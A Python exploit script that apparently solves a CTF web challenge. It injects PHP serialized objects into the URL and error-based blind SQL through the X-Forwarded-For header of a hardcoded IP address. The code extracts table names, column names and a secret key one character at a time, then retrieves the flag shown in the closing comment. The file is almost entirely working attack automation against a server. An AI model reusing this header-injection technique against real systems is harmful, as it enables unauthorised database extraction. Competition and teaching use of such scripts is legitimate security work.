import requests

url = 'http://101.32.205.189/?input=O:4:%22flag%22:1:{s:2:%22ip%22;O:2:%22ip%22:0:{};}'

table_1, table_len2, table_2, column_len1, column_len2, column1, column2, key_len, key = "", 0, "", 0, 0, "", "", 0, ""
headers = {"X-Forwarded-For":""}
def table_name1():
	global table_1
	payload = "',if((substr((select table_name from information_schema.tables where table_schema='n1ctf_websign' limit 0, 1),{},1)='{}'), exp(709 * length('n1ctf')),'False'))#"
	for i in range(4):
		for j in range(44, 122):
			headers = {"X-Forwarded-For": payload.format(i+1, chr(j))} 
			res = requests.get(url, headers=headers)
			if "<code>noip</code>" not in res.text:
				table_1 += chr(j)
				print("[+] One_Table_Name : {}".format(table_1.lower()))
				break

def table_len2():
	global table_len2
	payload = "',if((select length(table_name) from information_schema.tables where table_schema='n1ctf_websign' limit 1,1) ={}, exp(709 * length('n1ctf')),'False'));#" 
	for i in range(100):
		headers["X-Forwarded-for"] = payload.format(i)
		res = requests.get(url,headers=headers)
		if "<code>noip</code>" not in res.text:
			table_len2 = i
			print("[+] Two_Table_Name Length : {}".format(str(table_len2)))
			break

def table_name2():
	global table_2
	payload = "',if((substr((select table_name from information_schema.tables where table_schema='n1ctf_websign' limit 1, 1),{},1)='{}'), exp(709 * length('n1ctf')),'False'))#"
	for i in range(table_len2):
		for j in range(44, 122):
			headers["X-Forwarded-for"] = payload.format(i+1, chr(j))
			res = requests.get(url, headers=headers)
			if "<code>noip</code>" not in res.text:
				table_2 += chr(j).lower()
				print("[+] Two_Table_Name : {}".format(table_2))
				break	

def table_name2_column():
	global column_len1, column_len2
	payload = "',if((select length(column_name) from information_schema.columns where table_schema ='n1ctf_websign' and table_name = '{}' limit {},1) ={}, exp(709 * length('n1ctf')),'False'))#"
	for j in range(2):
		for i in range(100):
			headers["X-Forwarded-for"] = payload.format(table_2, j, i)
			res = requests.get(url, headers=headers)
			if "<code>noip</code>" not in res.text:
				if j == 0:
					column_len1 = i
				elif j == 1:
					column_len2 = i
				print("[+] {}, {}_Column_Name Length : {}".format(table_2, str(j+1), str(i)))
				break

def column():
	global column1, column2
	payload = "',if((substr((select column_name from information_schema.columns where table_schema='n1ctf_websign' and table_name = '{}' limit {},1),{},1)='{}'), exp(709 * length('n1ctf')),'False'));#"
	for i in range(2):
		if i == 0:
			Len = 2
		elif i == 1:
			Len = 3
		for j in range(Len):
			for k in range(48, 123):
				headers["X-Forwarded-for"] = payload.format(table_2, i, j+1, chr(k))
				if k == 92:
					break
				res = requests.get(url, headers=headers)
				if "<code>noip</code>" not in res.text:
					if i == 0:
						column1 += chr(k).lower()
						print("[+] n1key, 1_Column_Name : {}".format(column1))
						break
					elif i == 1:
						column2 += chr(k).lower()
						print("[+] n1key, 2_Column_Name : {}".format(column2))

def keylen():
	global key_len
	payload = "',if((select length(`key`) from {})={}, exp(709 * length('n1ctf')),'False'));#"
	for i in range(100):
		headers["X-Forwarded-for"] = payload.format(table_2, i)
		res = requests.get(url, headers=headers)
		if "<code>noip</code>" not in res.text:
			key_len = i
			print("[+] n1key, Key Length : {}".format(str(i)))
			break

def Key():
	global key
	payload = "',if((substr((select `key` from {}),{},1)='{}'), exp(709 * length('n1ctf')),'False'));#"
	for i in range(25):
		for j in range(48, 123):
			headers["X-Forwarded-for"] = payload.format(table_2, i+1, chr(j))
			res = requests.get(url, headers=headers)
			if "<code>noip</code>" not in res.text:
				key += chr(j).lower()
				break
	print("[+] n1key, Key : {}".format(key))

def flag():
	url = 'http://101.32.205.189/?input=O:4:"flag":1:{s:5:"check";s:25:"' + key + '"}'
	res = requests.get(url)
	flag = res.text.split("</code")[1].split("<code>")[0].replace("\n","").replace(">","")
	print("[+] " + flag)


def main():
	table_name1()
	table_len2()
	table_name2()
	table_name2_column()
	column()
	keylen()
	Key()
	#flag()

if __name__ == '__main__':
	print("[+] Start")
	main()

# Output : n1ctf{you_g0t_1t_hack_for_fun}